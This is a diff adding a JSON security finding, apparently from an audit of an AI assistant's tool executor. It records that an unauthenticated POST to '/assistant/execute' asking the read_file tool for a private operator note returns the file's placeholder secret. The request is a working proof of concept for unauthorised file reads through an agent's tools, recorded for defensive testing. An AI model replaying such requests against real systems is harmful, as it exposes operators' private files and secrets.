@@ -1,0 +1,29 @@
+{
+  "id": "16-exec-read-private",
+  "title": "Executor без auth: чтение приватного файла",
+  "endpoint": "POST /assistant/execute (read_file private/operator-note.txt)",
+  "expected": "401/403 для приватного файла",
+  "actual": "status=200, body={'content': 'TEST_ONLY_OPERATOR_SECRET'}",
+  "severity": "High",
+  "cwe": "CWE-22",
+  "owasp_llm": "LLM06",
+  "request": {
+    "method": "POST",
+    "path": "/assistant/execute",
+    "body": {
+      "decision": {
+        "tool": "read_file",
+        "arguments": {
+          "path": "private/operator-note.txt"
+        }
+      }
+    },
+    "headers": {}
+  },
+  "response": {
+    "status": 200,
+    "body": {
+      "content": "TEST_ONLY_OPERATOR_SECRET"
+    }
+  }
+}
